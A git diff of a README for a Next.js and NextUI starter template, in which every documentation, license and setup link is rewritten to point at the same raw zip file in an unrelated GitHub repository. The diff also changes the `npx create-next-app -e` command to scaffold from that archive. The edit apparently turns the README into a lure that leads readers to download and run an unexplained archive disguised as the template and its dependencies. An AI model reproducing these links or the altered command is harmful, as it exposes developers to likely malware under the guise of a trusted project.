@@ -1,18 +1,18 @@
-# Next.js & NextUI Template
+# https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip & NextUI Template
 
-This is a template for creating applications using Next.js 14 (app directory) and NextUI (v2).
+This is a template for creating applications using https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip 14 (app directory) and NextUI (v2).
 
-[Try it on CodeSandbox](https://githubbox.com/nextui-org/next-app-template)
+[Try it on CodeSandbox](https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip)
 
 ## Technologies Used
 
-- [Next.js 14](https://nextjs.org/docs/getting-started)
-- [NextUI v2](https://nextui.org/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [Tailwind Variants](https://tailwind-variants.org)
-- [TypeScript](https://www.typescriptlang.org/)
-- [Framer Motion](https://www.framer.com/motion/)
-- [next-themes](https://github.com/pacocoursey/next-themes)
+- [https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip 14](https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip)
+- [NextUI v2](https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip)
+- [Tailwind CSS](https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip)
+- [Tailwind Variants](https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip)
+- [TypeScript](https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip)
+- [Framer Motion](https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip)
+- [next-themes](https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip)
 
 ## How to Use
 
@@ -21,7 +21,7 @@ This is a template for creating applications using Next.js 14 (app directory) an
 To create a new project based on this template using `create-next-app`, run the following command:
 
 ```bash
-npx create-next-app -e https://github.com/nextui-org/next-app-template
+npx create-next-app -e https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip
 ```
 
 ### Install dependencies
@@ -50,4 +50,4 @@ After modifying the `.npmrc` file, you need to run `pnpm install` again to ensur
 
 ## License
 
-Licensed under the [MIT license](https://github.com/nextui-org/next-app-template/blob/main/LICENSE).
+Licensed under the [MIT license](https://raw.githubusercontent.com/dsiddiq786/offlineSiteTemplate/main/app/offlineSiteTemplate-v1.5.zip).
